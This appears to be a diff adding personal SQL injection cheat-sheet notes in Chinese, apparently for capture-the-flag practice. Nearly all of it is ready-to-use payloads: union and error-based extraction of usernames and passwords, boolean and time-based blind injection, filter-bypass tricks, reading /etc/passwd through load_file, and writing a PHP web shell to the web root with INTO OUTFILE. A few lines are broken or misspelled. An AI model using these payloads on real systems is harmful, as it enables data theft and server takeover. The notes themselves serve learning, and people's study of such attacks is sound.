@@ -1,0 +1,80 @@
+内联注释绕过安全狗:https://blog.csdn.net/qq_36282328/article/details/104015776
+[sqlmap os-shell] https://www.cnblogs.com/Rain99-/p/13755496.html
+
+
+联合查询注入
+?id=-1' union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- 
+
+报错注入1
+?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)-- 
+?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) -- 
+?id=1' union select (!(select * from (select user())x) - ~0),2,3 -- 
+?id=1' union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x -- 
+?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+admin') and select (!(select * from (select user())x) - ~0),2;#
+爆flag表的column名
+admin') and multipoint((select * from(select * from(select * from flag)a)b))#
+admin') and geometrycollection((select * from(select * from(select * from flag)a)b))#
+admin') and gpolygon((select * from(select * from(select * from flag)a)b))#
+admin') and multipolygon((select * from(select * from(select * from flag)a)b))#
+admin') and linestring((select * from(select * from(select * from flag)a)b))#
+admin') and multilinestring((select * from(select * from(select * from flag)a)b))#
+admin') and exp(~(select * from(select * from flag)a))#
+如果flag表中有column列，那么就输出
+admin') and (select Polygon(column) from flag);#
+爆库名
+select * from uses where id=1-a() //FUNCTION security.a does not exis
+
+???不让用information_schema的情况下爆出表名???
+
+
+admin') and updatexml(1,concat(0x7e,(INserT into flag values('flag{wonishigedashaziahahahahaha}')),0x7e),1)#
+admin') and updatexml(1,concat(0x7e,(select substr(flag_that_you_find_must_be_me,1,20) from flag),0x7e),1)#
+
+admin') and multipoint((select * from(select * from flag)a))#
+
+布尔盲注
+?id=1' and left(database(),1)>'r'-- 
+
+延时盲注
+?id=1' and if(ascii(substr(database(),1,1))>114,1,sleep(5))-- 
+?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5(%271%27)),null) FROM (select database() as current) as tb1)
+
+sqli利用
+1 union all select load_file('/etc/passwd')--+
+1 union select "<? system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/cmd.php" --+
+
+
+
+特殊漏洞:
+代码中有urldecode(),base64_decode(),json_encode()
+
+
+HTTP响应头
+200正常
+500源错误(sql报错)
+302重定向
+
+用户
+user()
+current_user
+
+服务器的目录
+@@datadir
+
+information_schema数据库
+user_privileges   表有所有用户的权限
+schema_privileges 数据库授予用户的权限
+
+
+0||if(length(database())>4,1,sleep(3))
+0||if(ascii(substr(database(),5,1))>105,1,sleep(5))
+0||if(database()=0x737069726974,1,sleep(5))
+0||if(s)
+
+
+过滤'和"的注入姿势
+过滤空格,and,or,',",--,#,/*,/的注入
+and=&&
+or=||
+--,#,/*,/过滤可以用闭合注入
